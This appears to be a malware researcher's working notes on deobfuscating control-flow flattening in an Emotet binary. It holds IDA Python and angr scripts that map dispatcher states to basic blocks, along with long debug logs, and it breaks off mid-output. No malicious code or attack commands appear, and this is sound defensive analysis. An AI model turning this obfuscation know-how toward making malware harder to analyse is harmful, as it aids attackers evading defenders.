0x100098a4 State Value: 4 Children: 0x100098e8 0x100098a4 Successor: 0x100098e8 State entry bb found! Already processed this state - END! Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 3 Children: 0x100095a9 0x10009573 Successor: 0x100095a9 State entry bb found! Already processed this state - END! Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 3 !! Already processed for this state - END !! ============================== BB: 0x10009555 - 0x1000955b State Value: 5 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! Already processed this state - END! Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 5 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! Already processed this state - END! Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 7 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x10009573 - 0x1000957b State Value: 9 Children: 0x1000957b 0x100099c6 Successor: 0x1000957b State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 9 Children: 0x10009894 Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x10009563 - 0x1000956f State Value: 4 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! Already processed this state - END! Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 4 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009573 - 0x1000957b State Value: 3 Children: 0x1000957b 0x100099c6 Successor: 0x1000957b State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 5 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! Already processed this state - END! Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 5 Children: 0x100098e8 0x100098a4 Successor: 0x100098e8 State entry bb found! Already processed this state - END! Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 7 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! Already processed this state - END! Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 7 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! Already processed this state - END! Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 9 !! Already processed for this state - END !! ============================== BB: 0x10009894 - 0x100098a0 State Value: 9 !! Already processed for this state - END !! ============================== BB: 0x1000956f - 0x10009573 State Value: 4 Children: 0x100095a9 0x10009573 Successor: 0x100095a9 State entry bb found! Already processed this state - END! Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 4 !! Already processed for this state - END !! ============================== BB: 0x100099c6 - 0x100099d2 State Value: 3 !! Already processed for this state - END !! ============================== BB: 0x10009563 - 0x1000956f State Value: 5 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! Already processed this state - END! Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 5 Children: 0x100098ac 0x100099c6 Successor: 0x100098ac State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 7 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! Already processed this state - END! Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 7 Children: 0x100098e8 0x100098a4 Successor: 0x100098e8 State entry bb found! Already processed this state - END! Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x10009573 - 0x1000957b State Value: 4 Children: 0x1000957b 0x100099c6 Successor: 0x1000957b State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 5 Children: 0x100095a9 0x10009573 Successor: 0x100095a9 State entry bb found! Already processed this state - END! Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 5 !! Already processed for this state - END !! ============================== BB: 0x10009563 - 0x1000956f State Value: 7 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! Already processed this state - END! Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 7 Children: 0x100098ac 0x100099c6 Successor: 0x100098ac State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 4 !! Already processed for this state - END !! ============================== BB: 0x10009573 - 0x1000957b State Value: 5 Children: 0x1000957b 0x100099c6 Successor: 0x1000957b State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 7 Children: 0x100095a9 0x10009573 Successor: 0x100095a9 State entry bb found! Already processed this state - END! Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 7 !! Already processed for this state - END !! ============================== BB: 0x100099c6 - 0x100099d2 State Value: 5 !! Already processed for this state - END !! ============================== BB: 0x10009573 - 0x1000957b State Value: 7 Children: 0x1000957b 0x100099c6 Successor: 0x1000957b State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 7 !! Already processed for this state - END !! ** Completed initial analysis ** 0x10008784 - States: [0] Children: [&#39;0x10008914&#39;] 0x10008914 - States: [0] Children: [&#39;0x10008aa1&#39;] 0x10008aa1 - States: [0] Children: [&#39;0x10008c31&#39;] 0x10008c31 - States: [0] Children: [&#39;0x10008dbb&#39;] 0x10008dbb - States: [0] Children: [&#39;0x10008f47&#39;] 0x10008f47 - States: [0] Children: [&#39;0x100090d0&#39;] 0x100090d0 - States: [0] Children: [&#39;0x1000925d&#39;] 0x1000925d - States: [0] Children: [&#39;0x100093e6&#39;] 0x100093e6 - States: [0] Children: [&#39;0x1000953a&#39;] 0x1000953a - States: [0, 1, 9] Children: [&#39;0x10009549&#39;] 0x10009549 - States: [0, 1, 2, 3, 4, 5, 7, 9] Children: [&#39;0x10009894&#39;, &#39;0x10009555&#39;] 0x10009555 - States: [0, 2, 1, 9, 3, 4, 5, 7] Children: [&#39;0x1000955b&#39;, &#39;0x10009863&#39;] 0x1000955b - States: [0, 2, 1, 9, 3, 4, 5, 7] Children: [&#39;0x10009563&#39;, &#39;0x100097cd&#39;] 0x10009563 - States: [0, 2, 1, 9, 3, 4, 5, 7] Children: [&#39;0x10009713&#39;, &#39;0x1000956f&#39;] 0x1000956f - States: [0, 2, 1, 9, 3, 4, 5, 7] Children: [&#39;0x100095a9&#39;, &#39;0x10009573&#39;] 0x10009573 - States: [0, 2, 1, 9, 3, 4, 5, 7] Children: [&#39;0x1000957b&#39;, &#39;0x100099c6&#39;] 0x1000957b - States: [9] Children: [&#39;0x10009595&#39;] 0x10009595 - States: [9] Children: [&#39;0x1000953a&#39;] 0x100095a9 - States: [7] Children: [&#39;0x100095c2&#39;] 0x100095c2 - States: [7] Children: [&#39;0x100095e3&#39;] 0x100095e3 - States: [7] Children: [&#39;0x10009615&#39;] 0x10009615 - States: [7] Children: [&#39;0x100096a2&#39;] 0x100096a2 - States: [7] Children: [&#39;0x100096d6&#39;] 0x100096d6 - States: [7] Children: [&#39;0x100096f2&#39;] 0x100096f2 - States: [7] Children: [&#39;0x100096f5&#39;] 0x100096f5 - States: [5, 7] Children: [&#39;0x100096fa&#39;] 0x100096fa - States: [3, 4, 5, 7] Children: [&#39;0x100099c6&#39;] 0x10009713 - States: [5] Children: [&#39;0x10009732&#39;] 0x10009732 - States: [5] Children: [&#39;0x10009750&#39;] 0x10009750 - States: [5] Children: [&#39;0x1000977e&#39;] 0x1000977e - States: [5] Children: [&#39;0x100097af&#39;] 0x100097af - States: [5] Children: [&#39;0x100097c5&#39;] 0x100097c5 - States: [5] Children: [&#39;0x100096f5&#39;] 0x100097cd - States: [3] Children: [&#39;0x100097e6&#39;] 0x100097e6 - States: [3] Children: [&#39;0x10009830&#39;] 0x10009830 - States: [3] Children: [&#39;0x1000985b&#39;] 0x1000985b - States: [3] Children: [&#39;0x100096fa&#39;] 0x10009863 - States: [1] Children: [&#39;0x1000988a&#39;] 0x1000988a - States: [1] Children: [&#39;0x1000953a&#39;] 0x10009894 - States: [0, 2, 9, 3, 4, 5, 7] Children: [&#39;0x100098a0&#39;, &#39;0x100099c1&#39;] 0x100098a0 - States: [0, 2, 9, 3, 4, 5, 7] Children: [&#39;0x100098e8&#39;, &#39;0x100098a4&#39;] 0x100098a4 - States: [0, 2, 9, 3, 4, 5, 7] Children: [&#39;0x100098ac&#39;, &#39;0x100099c6&#39;] 0x100098ac - States: [6] Children: [&#39;0x100098d8&#39;] 0x100098d8 - States: [6] Children: [&#39;0x100098db&#39;] 0x100098db - States: [8, 6] Children: [] 0x100098e8 - States: [4] Children: [&#39;0x10009904&#39;] 0x10009904 - States: [4] Children: [&#39;0x1000998c&#39;] 0x1000998c - States: [4] Children: [&#39;0x10009998&#39;, &#39;0x1000999f&#39;] 0x10009998 - States: [4] Children: [&#39;0x100099a4&#39;] 0x1000999f - States: [4] Children: [&#39;0x100099a4&#39;] 0x100099a4 - States: [4] Children: [&#39;0x100099ba&#39;] 0x100099ba - States: [4] Children: [&#39;0x100096fa&#39;] 0x100099c1 - States: [2] Children: [&#39;0x100099c6&#39;] 0x100099c6 - States: [0, 1, 2, 3, 4, 5, 7, 9] Children: [&#39;0x10009549&#39;, &#39;0x100099d2&#39;] 0x100099d2 - States: [8] Children: [&#39;0x100098db&#39;] . IDA Script - Label The Basic Blocks . import idaapi import idautils import idc from queue import Queue import struct bb_states = {268470148: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548}, 268470548: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470945}, 268470945: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471345}, 268471345: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471739}, 268471739: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472135}, 268472135: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472528}, 268472528: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472925}, 268472925: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473318}, 268473318: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473658}, 268473658: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473673}, 268473673: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473685}, 268473685: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473691}, 268473691: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473699}, 268473699: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473711}, 268473711: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473715}, 268473715: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473723}, 268473723: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473749}, 268473749: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473769}, 268473769: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473794}, 268473794: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473827}, 268473827: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473877}, 268473877: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474018}, 268474018: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474070}, 268474070: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474098}, 268474098: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474101}, 268474101: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474106}, 268474106: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474131}, 268474131: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474162}, 268474162: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474192}, 268474192: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474238}, 268474238: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474287}, 268474287: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474309}, 268474309: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474317}, 268474317: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474342}, 268474342: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474416}, 268474416: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474459}, 268474459: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474467}, 268474467: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474506}, 268474506: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474516}, 268474516: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474528}, 268474528: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474532}, 268474532: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474540}, 268474540: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474584}, 268474584: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474587}, 268474587: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474600}, 268474600: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474628}, 268474628: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474764}, 268474764: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474776}, 268474776: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474783}, 268474783: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474788}, 268474788: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474810}, 268474810: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474817}, 268474817: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474822}, 268474822: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474834}, 268474834: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474839}} def set_bb_color(ea_start, ea_end, color_value): ea_end = prev_head(ea_end) ptr = ea_start while ptr &lt;= ea_end : set_color(ptr, CIC_ITEM, color_value) ptr = next_head(ptr) for b in bb_states: print(f&quot;{hex(b)} - {hex(bb_states[b].get(&#39;end&#39;))}: {bb_states[b].get(&#39;is_obb&#39;)}&quot;) if bb_states[b].get(&#39;is_obb&#39;): set_bb_color(b, bb_states[b].get(&#39;end&#39;), 0x00ff00) else: set_bb_color(b, bb_states[b].get(&#39;end&#39;), 0x00A5ff) # Color the bb entry set_color(b, CIC_ITEM, 0xc0c0c0) . Obtain STATE and NEXT-STATE Information For Each Basic Block . loop through all bb | start with STATE = 0 in obb | from obb run until you hit a cf bb - push branches onto queue note the STATE register VALUE - this is the NEXT STATE VALUE | use the STATE register value to derive the FLAGS constraints (this will be used for patching) | note the STATE end bb | . | from cf run until you hit an obb assign the NEXT STATE VALUE to this obb and note the STATE entry bb | . | end at obb you have alreay seen | end at end block | . state_map[&#39;state_value&#39;] = {&#39;state_value&#39;: None &#39;entry_bb&#39;: None &#39;exit_bb&#39;: None &#39;next_states&#39;: [ {&#39;state_value&#39;:None, &#39;flags&#39;: None }, ] } . # state_table[state_value] = { # &#39;entry&#39;:&lt;entry_bb_address&gt;, # &#39;exit&#39;:&lt;exit_bb_address&gt;, # &#39;next_states&#39;:[{&#39;state_value&#39;:&lt;&gt;, &#39;flags&#39;:&lt;constrait_flags&gt;},] # } state_table = {} ## Build list of cf and obb blocks cf_bb_list = [] obb_list = [] for bb_address in bb_state_map: if bb_state_map[bb_address].get(&#39;is_obb&#39;): obb_list.append(bb_address) else: cf_bb_list.append(bb_address) # Use a queue for BFS # The queue contains state_info = { # &#39;state_value&#39;:0, # &#39;sim_state&#39;:initial_state, # &#39;entry&#39;:true/false, # &#39;condition&#39;:&lt;none / jz / etc.&gt; # } q = Queue() # Function information BINARY_PATH = &#39;/tmp/emotet.bin&#39; fn_start = 0x10008784 fn_end = 0x100099D2 state_register = &#39;ebx&#39; # Start angr project project = angr.Project(BINARY_PATH, load_options={&#39;auto_load_libs&#39;: False}) # Setup function initial state on queue initial_state = project.factory.call_state(addr=fn_start) # Use this setting to skip calls instead of a hook initial_state.options.add(angr.options.CALLLESS) # Add first state to state table (call it state 0) state_table[0] = {&#39;entry&#39;:fn_start, &#39;exit&#39;:None,&#39;next_states&#39;:[]} # Push state info for first state onto queue state_info = {&#39;state_value&#39;:0, &#39;sim_state&#39;:initial_state, &#39;entry&#39;:True, &#39;condition&#39;:None } q.put(state_info) # Walk the queue while not q.empty(): state_info = q.get() state_value = state_info.get(&#39;state_value&#39;) state_entry = state_info.get(&#39;entry&#39;) old_sim_state = state_info.get(&#39;sim_state&#39;) # Flag to control end of state and error end state_end = False error_end = False sim_state = old_sim_state # # Setup blank state but carry regsiters # # Set clean sim_state # if not state_entry: # sim_state = old_sim_state # else: # sim_state = project.factory.blank_state(addr=old_sim_state.addr) # sim_state.options.add(angr.options.CALLLESS) # for reg_name in [&#39;eax&#39;,&#39;ecx&#39;,&#39;edx&#39;,&#39;ebx&#39;,&#39;esp&#39;,&#39;ebp&#39;,&#39;esi&#39;,&#39;edi&#39;]: # if reg_name != state_register: # sim_state.memory.store(sim_state.regs.get(reg_name), old_sim_state.regs.get(reg_name)) print(f&quot; n n n======================== n&quot;) print(f&quot;Walking obbs for state {hex(state_value)} - Entry: {state_entry}&quot;) # Walk until cf or branch or dead loop_limit_count = 0 while loop_limit_count &lt;= 1000: loop_limit_count += 1 print(f&quot;obb walk: {hex(sim_state.addr)}&quot;) #print(f&quot;STATE:{sim_state.regs.ebx} - FLAGS: {sim_state.regs.flags.variables}&quot;) successors = list(project.factory.successors(sim_state)) # print(f&quot;Successors:&quot;) # for s in successors: # print(f&quot; t{hex(s.addr)} - STATE:{s.regs.get(state_register)}&quot;) if len(successors) == 0: # dead - mark this bb as exit - continue next in queue state_table[state_value][&#39;exit&#39;] = sim_state.addr state_end = True print(f&quot;State {hex(state_value)} exit at bb: {hex(sim_state.addr)}&quot;) break elif len(successors) &gt; 1: # Check each one to see if it is a cf # Assumption: there should never be a branch from an obb into the dispatcher if successors[0].addr in cf_bb_list and successors[1].addr in cf_bb_list: print(f&quot;ERROR bb: {hex(sim_state.addr)} - obb branch both successors are cf&quot;) error_end = True break elif successors[0].addr in cf_bb_list and successors[1].addr not in cf_bb_list: print(f&quot;ERROR bb: {hex(sim_state.addr)} - obb branch successor[0] are cf&quot;) error_end = True break elif successors[0].addr not in cf_bb_list and successors[1].addr in cf_bb_list: print(f&quot;ERROR bb: {hex(sim_state.addr)} - obb branch successor[1] are cf&quot;) error_end = True break else: # branch - push second on queue and continue walking print(&quot;Branch found!&quot;) # if the condition is an == we can save it in the hope that it might be useful # when determining a state later -- this is a hack and we don&#39;t propogate conditions for # multiple obb branches -- there should be a better way to do this??? successors[0].solver.simplify() successors[1].solver.simplify() constraints_0 = [] constraints_1 = [] for cc in successors[0].solver.constraints: if not cc.concrete: constraints_0.append(cc) for cc in successors[1].solver.constraints: if not cc.concrete: constraints_1.append(cc) if len(constraints_0) == 1 and len(constraints_1): if constraints_0[0].op == &#39;__eq__&#39;: print(f&quot;{hex(successors[0].addr)} is __eq__ pushing to queue&quot;) sim_state = successors[1] queue_state = successors[0].copy() branch_condition = &#39;jz&#39; elif constraints_1[0].op == &#39;__eq__&#39;: print(f&quot;{hex(successors[1].addr)} is __eq__ pushing to queue&quot;) sim_state = successors[0] queue_state = successors[1].copy() branch_condition = &#39;jz&#39; else: print(f&quot;Constraint is not __eq__ not propogating condition&quot;) sim_state = successors[0] queue_state = successors[1].copy() branch_condition = None else: print(f&quot;More than one constraint not propogating condition&quot;) print(constraints_0) print(constraints_1) sim_state = successors[0] queue_state = successors[1].copy() branch_condition = None print(f&quot;Add bb: {hex(queue_state.addr)} to queue - continue with bb: {hex(sim_state.addr)}&quot;) branch_state_info = {&#39;state_value&#39;:state_value, &#39;sim_state&#39;:queue_state, &#39;entry&#39;:False, &#39;condition&#39;:branch_condition} q.put(branch_state_info) else: # Check if the sccessor is outside of the function, this is some crazy angr thing with # following ret instructions instead of dying if successors[0].addr &lt; fn_start or successors[0].addr &gt; fn_end: # This is an end state - mark this bb as exit - continue next in queue state_table[state_value][&#39;exit&#39;] = sim_state.addr state_end = True print(f&quot;State {hex(state_value)} return at bb: {hex(sim_state.addr)}&quot;) break if successors[0].addr in cf_bb_list: successor = successors[0] # cf - get state value (next state) # - get flags and add to state table next states next_state_values = successor.solver.eval_upto(successor.regs.get(state_register), 4) print(f&quot;{successor.regs.get(state_register)}&quot;) ######### DEBUG Constrain Next State ######### conditions_map = {} # Looking for ast in the form IF (foo __eq__ bar) then STATE1 else STATE2 state_reg_ast = successor.regs.get(state_register) if not state_reg_ast.concrete: if state_reg_ast.op == &#39;If&#39; and not state_reg_ast.args[1].symbolic and not state_reg_ast.args[1].symbolic: if state_reg_ast.args[0].op == &#39;__eq__&#39;: print(f&quot;{hex(successor.solver.eval(state_reg_ast.args[1]))} constrained by jz&quot;) conditions_map[successor.solver.eval(state_reg_ast.args[1])] = &#39;jz&#39; print(f&quot;{hex(successor.solver.eval(state_reg_ast.args[2]))} unconstrained&quot;) else: print(f&quot;!!!! If condition {state_reg_ast.args[0].op} not handled&quot;) else: print(&quot;!!!! Top level condition to complex to handle&quot;) else: # If this is concrete test if it has a prior condition if state_info.get(&#39;condition&#39;, None) is None: print(&quot; * Concrete * &quot;) else: print(f&quot; * Queue condtion {state_info.get(&#39;condition&#39;)} * &quot;) conditions_map[next_state_values[0]] = &#39;jz&#39; ########################################## # Save info to state table state_table[state_value][&#39;exit&#39;] = sim_state.addr for next_state_value in next_state_values: state_table[state_value][&#39;next_states&#39;].append({&#39;state_value&#39;:next_state_value, &#39;condition&#39;:conditions_map.get(next_state_value,None)}) print(f&quot;State: {hex(state_value)} -&gt; Next States {[hex(s) for s in next_state_values]}&quot;) sim_state = successors[0] break else: sim_state = successors[0] # Check state end flag if state_end: continue if error_end: break print(f&quot; n n&quot;) frozen_sim_state = sim_state # For each state match with obb and push onto queue # - if seen - continue next in queue # - if not seen walk to obb for next_state_value in next_state_values: print(f&quot;Walking dispatcher for state {hex(next_state_value)}&quot;) if state_entry and next_state_value in state_table: # We have already processed this skip print(f&quot;Already processed {hex(next_state_value)} - skip!&quot;) continue # Setup sim_state with concrete state_value sim_state = frozen_sim_state.copy() sim_state.regs.__setattr__(state_register, next_state_value) # Walk until obb loop_limit_count = 0 while loop_limit_count &lt;= 1000: loop_limit_count += 1 print(f&quot;cf walk: {hex(sim_state.addr)}&quot;) successors = list(project.factory.successors(sim_state)) # print(f&quot; t Successors: {[hex(s.addr) for s in successors]}&quot;) if len(successors) == 0: # dead - error! no path for state through dispatcher print(f&quot;ERROR no path through dispatcher for state {hex(next_state_value)} - end bb: {hex(sim_state.addr)}&quot;) error_end = True break elif len(successors) &gt; 1: # branch - error! duplicate dispatcher paths print(f&quot;ERROR duplicate paths through dispatcher for state {hex(next_state_value)} - branch bb: {hex(sim_state.addr)}&quot;) for s in successors: for c in s.solver.constraints: print(f&quot; t{c}&quot;) error_end = True break else: if successors[0].addr in obb_list: print(f&quot;Found matching obb: {hex(successors[0].addr)}&quot;) # obb - add state and entry to state_table state_table[next_state_value] = {&#39;entry&#39;:successors[0].addr, &#39;exit&#39;:None, &#39;next_states&#39;:[]} # - push to queue - continue next in queue new_state_info = {&#39;state_value&#39;:next_state_value, &#39;sim_state&#39;:successors[0].copy(), &#39;entry&#39;:True, &#39;condition&#39;:None} q.put(new_state_info) break else: sim_state = successors[0] if error_end: break if error_end: break . ======================== Walking obbs for state 0x0 - Entry: True obb walk: 0x10008784 obb walk: 0x10008914 obb walk: 0x10008aa1 obb walk: 0x10008c31 obb walk: 0x10008dbb obb walk: 0x10008f47 obb walk: 0x100090d0 obb walk: 0x1000925d obb walk: 0x100093e6 &lt;BV32 0x9a37631&gt; * Concrete * State: 0x0 -&gt; Next States [&#39;0x9a37631&#39;] Walking dispatcher for state 0x9a37631 cf walk: 0x10009894 Found matching obb: 0x100099c1 ======================== Walking obbs for state 0x9a37631 - Entry: True obb walk: 0x100099c1 &lt;BV32 0x3fd6f7a&gt; * Concrete * State: 0x9a37631 -&gt; Next States [&#39;0x3fd6f7a&#39;] Walking dispatcher for state 0x3fd6f7a cf walk: 0x10009549 cf walk: 0x10009555 cf walk: 0x1000955b cf walk: 0x10009563 Found matching obb: 0x10009713 ======================== Walking obbs for state 0x3fd6f7a - Entry: True obb walk: 0x10009713 obb walk: 0x10009732 obb walk: 0x10009750 obb walk: 0x1000977e obb walk: 0x100097af obb walk: 0x100097c5 &lt;BV32 if fake_ret_value_278_32{UNINITIALIZED} == 0x0 then 0x8d4442d else 0xd886856&gt; 0x8d4442d constrained by jz 0xd886856 unconstrained State: 0x3fd6f7a -&gt; Next States [&#39;0xd886856&#39;, &#39;0x8d4442d&#39;] Walking dispatcher for state 0xd886856 cf walk: 0x100096f5 cf walk: 0x100099c6 Found matching obb: 0x100099d2 Walking dispatcher for state 0x8d4442d cf walk: 0x100096f5 cf walk: 0x100099c6 cf walk: 0x10009549 cf walk: 0x10009555 cf walk: 0x1000955b cf walk: 0x10009563 cf walk: 0x1000956f Found matching obb: 0x100095a9 ======================== Walking obbs for state 0xd886856 - Entry: True obb walk: 0x100099d2 obb walk: 0x100098db State 0xd886856 return at bb: 0x100098db ======================== Walking obbs for state 0x8d4442d - Entry: True obb walk: 0x100095a9 obb walk: 0x100095c2 obb walk: 0x100095e3 obb walk: 0x10009615 obb walk: 0x100096a2 obb walk: 0x100096d6 obb walk: 0x100096f2 &lt;BV32 if fake_ret_value_284_32{UNINITIALIZED} == 0x0 then 0x3db060f else 0xe571e86&gt; 0x3db060f constrained by jz 0xe571e86 unconstrained State: 0x8d4442d -&gt; Next States [&#39;0x3db060f&#39;, &#39;0xe571e86&#39;] Walking dispatcher for state 0x3db060f cf walk: 0x100099c6 cf walk: 0x10009549 cf walk: 0x10009555 cf walk: 0x1000955b Found matching obb: 0x100097cd Walking dispatcher for state 0xe571e86 cf walk: 0x100099c6 cf walk: 0x10009549 cf walk: 0x10009894 cf walk: 0x100098a0 cf walk: 0x100098a4 Found matching obb: 0x100098ac ======================== Walking obbs for state 0x3db060f - Entry: True obb walk: 0x100097cd obb walk: 0x100097e6 obb walk: 0x10009830 obb walk: 0x1000985b &lt;BV32 if fake_ret_value_289_32{UNINITIALIZED} == 0x0 then 0x9005e79 else 0xe571e86&gt; 0x9005e79 constrained by jz 0xe571e86 unconstrained State: 0x3db060f -&gt; Next States [&#39;0x9005e79&#39;, &#39;0xe571e86&#39;] Walking dispatcher for state 0x9005e79 cf walk: 0x100096fa cf walk: 0x100099c6 cf walk: 0x10009549 cf walk: 0x10009555 cf walk: 0x1000955b cf walk: 0x10009563 cf walk: 0x1000956f cf walk: 0x10009573 Found matching obb: 0x1000957b Walking dispatcher for state 0xe571e86 Already processed 0xe571e86 - skip! ======================== Walking obbs for state 0xe571e86 - Entry: True obb walk: 0x100098ac obb walk: 0x100098d8 State 0xe571e86 return at bb: 0x100098d8 ======================== Walking obbs for state 0x9005e79 - Entry: True obb walk: 0x1000957b obb walk: 0x10009595 &lt;BV32 if fake_ret_value_294_32{UNINITIALIZED} == 0x0 then 0xe571e86 else 0xabd1e15&gt; 0xe571e86 constrained by jz 0xabd1e15 unconstrained State: 0x9005e79 -&gt; Next States [&#39;0xe571e86&#39;, &#39;0xabd1e15&#39;] Walking dispatcher for state 0xe571e86 Already processed 0xe571e86 - skip! Walking dispatcher for state 0xabd1e15 cf walk: 0x1000953a cf walk: 0x10009894 cf walk: 0x100098a0 Found matching obb: 0x100098e8 ======================== Walking obbs for state 0xabd1e15 - Entry: True obb walk: 0x100098e8 obb walk: 0x10009904 obb walk: 0x1000998c Branch found! 0x10009998 is __eq__ pushing to queue Add bb: 0x10009998 to queue - continue with bb: 0x1000999f obb walk: 0x1000999f obb walk: 0x100099ba &lt;BV32 0x94ee303&gt; * Concrete * State: 0xabd1e15 -&gt; Next States [&#39;0x94ee303&#39;] Walking dispatcher for state 0x94ee303 cf walk: 0x100096fa cf walk: 0x100099c6 cf walk: 0x10009549 cf walk: 0x10009555 Found matching obb: 0x10009863 ======================== Walking obbs for state 0xabd1e15 - Entry: False obb walk: 0x10009998 obb walk: 0x100099a4 obb walk: 0x100099ba &lt;BV32 0xe571e86&gt; * Queue condtion jz * State: 0xabd1e15 -&gt; Next States [&#39;0xe571e86&#39;] Walking dispatcher for state 0xe571e86 cf walk: 0x100096fa cf walk: 0x100099c6 cf walk: 0x10009549 cf walk: 0x10009894 cf walk: 0x100098a0 cf walk: 0x100098a4 Found matching obb: 0x100098ac ======================== Walking obbs for state 0x94ee303 - Entry: True obb walk: 0x10009863 obb walk: 0x1000988a &lt;BV32 0xe571e86&gt; * Concrete * State: 0x94ee303 -&gt; Next States [&#39;0xe571e86&#39;] Walking dispatcher for state 0xe571e86 Already processed 0xe571e86 - skip! ======================== Walking obbs for state 0xe571e86 - Entry: True obb walk: 0x100098ac obb walk: 0x100098d8 State 0xe571e86 return at bb: 0x100098d8 . for state in state_table: print(f&quot;{hex(state)} tEntry:{hex(state_table[state][&#39;entry&#39;])} Exit:{hex(state_table[state][&#39;exit&#39;])} -&gt; &quot;) for next_state in state_table[state][&#39;next_states&#39;]: print(f&quot; t t t t t t t{hex(next_state.get(&#39;state_value&#39;))}: {next_state.get(&#39;condition&#39;)} &quot;) . 0x0 Entry:0x10008784 Exit:0x100093e6 -&gt; 0x9a37631: None 0x9a37631 Entry:0x100099c1 Exit:0x100099c1 -&gt; 0x3fd6f7a: None 0x3fd6f7a Entry:0x10009713 